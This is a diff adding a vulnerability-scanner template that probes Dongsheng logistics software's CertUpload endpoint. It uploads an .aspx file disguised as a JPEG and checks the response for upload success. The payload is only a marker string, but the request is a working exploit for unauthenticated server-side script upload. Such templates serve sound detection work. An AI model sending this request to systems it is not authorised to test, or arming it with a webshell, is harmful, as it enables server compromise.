@@ -1,0 +1,43 @@
+id: dongshengwuliu-CertUpload-upload
+
+info:
+  name: 东胜物流软件CertUpload文件上传漏洞
+  author: dongshengwuliu
+  severity: high
+  tags: dongshengwuliu
+
+http:
+  - raw:
+      - |
+        POST /MsWlTruck/CertUpload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaKljzbg49Mq4ggLz
+
+        ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+        Content-Disposition: form-data; name="file"; filename="rc3d6e.aspx"
+        Content-Type: image/jpeg
+        
+        Lan438egResp35End
+        ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+        Content-Disposition: form-data; name="TruckNo";
+        
+        1
+        ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+        Content-Disposition: form-data; name="Cert_Type";
+        
+        1
+        ------WebKitFormBoundaryaKljzbg49Mq4ggLz--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"上传成功"'
+          - '"filePath"'
+          - '"success"'
+        condition: and
+      - type: status
+        status: 
+          - 200
